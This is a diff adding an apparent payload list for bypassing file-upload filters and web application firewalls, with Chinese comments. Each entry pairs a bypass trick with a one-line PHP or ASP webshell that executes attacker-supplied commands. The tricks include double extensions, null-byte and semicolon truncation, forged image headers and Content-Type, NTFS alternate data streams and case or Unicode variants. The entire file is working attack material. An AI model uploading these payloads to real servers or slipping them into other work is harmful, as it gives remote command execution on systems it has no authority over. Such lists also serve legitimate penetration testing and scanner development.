@@ -1,0 +1,30 @@
+# UPLOAD WAF 绕过 - 双扩展名绕过 (.php.jpg) + Webshell
+shell.php.jpg <?php system($_GET[1]);?>
+# UPLOAD WAF 绕过 - 空字节截断绕过 (PHP < 5.3) + Webshell
+shell.php%00.jpg <?php system($_GET[1]);?>
+# UPLOAD WAF 绕过 - 分号截断绕过 (IIS 6.0) + Webshell
+shell.asp;.jpg <% Execute(Request("cmd")) %>
+# UPLOAD WAF 绕过 - 尾随空格绕过 + Webshell
+shell.php  <?php system($_GET[1]);?>
+# UPLOAD WAF 绕过 - 尾随点号绕过 + Webshell
+shell.php. <?php system($_GET[1]);?>
+# UPLOAD WAF 绕过 - Content-Type 伪造为 image/jpeg + Webshell
+Content-Type: image/jpeg <?php system($_GET[1]);?>
+# UPLOAD WAF 绕过 - 图片头伪造 (GIF89a) + Webshell
+GIF89a;<?php system($_GET[1]);?>
+# UPLOAD WAF 绕过 - 图片头伪造 (PNG) + Webshell
+\x89PNG\r\n\x1a\n<?php system($_GET[1]);?>
+# UPLOAD WAF 绕过 - PHP 长标签绕过黑名单 + Webshell
+<script language="php">system($_GET[1]);</script>
+# UPLOAD WAF 绕过 - PHP 短标签绕过 + Webshell
+<?=system($_GET[1])?>
+# UPLOAD WAF 绕过 - Windows ADS 写入隐藏流 + Webshell
+shell.php::$DATA <?php system($_GET[1]);?>
+# UPLOAD WAF 绕过 - NTFS 文件系统特性绕过 (::$INDEX_ALLOCATION)
+shell.php::$INDEX_ALLOCATION <?php system($_GET[1]);?>
+# UPLOAD WAF 绕过 - phtml 扩展名绕过 + Webshell
+shell.phtml <?php system($_GET[1]);?>
+# UPLOAD WAF 绕过 - pHp 大小写绕过 + Webshell
+shell.pHp <?php system($_GET[1]);?>
+# UPLOAD WAF 绕过 - Unicode 文件名绕过 + Webshell
+shell.php%E3%80%82jpg <?php system($_GET[1]);?>
